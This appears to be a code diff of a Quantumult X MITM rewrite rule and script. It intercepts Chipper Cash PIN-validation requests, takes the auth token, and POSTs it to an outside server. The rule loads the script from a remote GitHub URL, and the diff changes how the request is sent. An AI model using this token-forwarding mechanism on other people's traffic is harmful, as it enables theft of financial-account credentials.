@@ -1,7 +1,7 @@
 /*
 [Script]
 # 拦截并处理 Token，然后发送到自定义服务器
-http-request ^https:\/\/auth\.chippercash\.com\/pin\/validate script-path=https://你的服务器地址/QuantumultX/selfie_challenge.js
+http-request ^https:\/\/auth\.chippercash\.com\/pin\/validate script-path=https://raw.githubusercontent.com/chucyfunny/chippertest/main/test.js
 
 [MITM]
 hostname = auth.chippercash.com
@@ -30,35 +30,34 @@ if (!token) {
 
   const body = {};
 
-  // 发送 POST 请求到服务器
-  $httpClient.post(
-    {
-      url: url,
-      headers: headers,
-      body: JSON.stringify(body)
-    },
-    function (error, response, data) {
-      if (error) {
-        // 处理请求错误
-        $notify('Request Error', 'Error occurred while sending the request', error);
+  // 使用 $task.fetch 发送 POST 请求到服务器
+  const options = {
+    url: url,
+    method: "POST",
+    headers: headers,
+    body: JSON.stringify(body)
+  };
+
+  $task.fetch(options).then(response => {
+    try {
+      const jsonData = JSON.parse(response.body);
+      if (jsonData.address) {
+        // 发送通知显示地址
+        $notify('Success', 'Address retrieved successfully', jsonData.address);
+      } else if (jsonData.error) {
+        // 处理返回的错误信息
+        $notify('Error', 'Error occurred on the server side', jsonData.error);
       } else {
-        try {
-          const jsonData = JSON.parse(data);
-          if (jsonData.address) {
-            // 发送通知显示地址
-            $notify('Success', 'Address retrieved successfully', jsonData.address);
-          } else if (jsonData.error) {
-            // 处理返回的错误信息
-            $notify('Error', 'Error occurred on the server side', jsonData.error);
-          } else {
-            $notify('Unexpected Response', 'The response did not contain the expected data.', '');
-          }
-        } catch (e) {
-          // 处理 JSON 解析错误
-          $notify('Response Error', 'Failed to parse the response', e.message);
-        }
+        $notify('Unexpected Response', 'The response did not contain the expected data.', '');
       }
-      $done({});  // 放行请求
+    } catch (e) {
+      // 处理 JSON 解析错误
+      $notify('Response Error', 'Failed to parse the response', e.message);
     }
-  );
+    $done({});  // 放行请求
+  }, reason => {
+    // 处理请求错误
+    $notify('Request Error', 'Error occurred while sending the request', reason.error);
+    $done({});  // 放行请求
+  });
 }
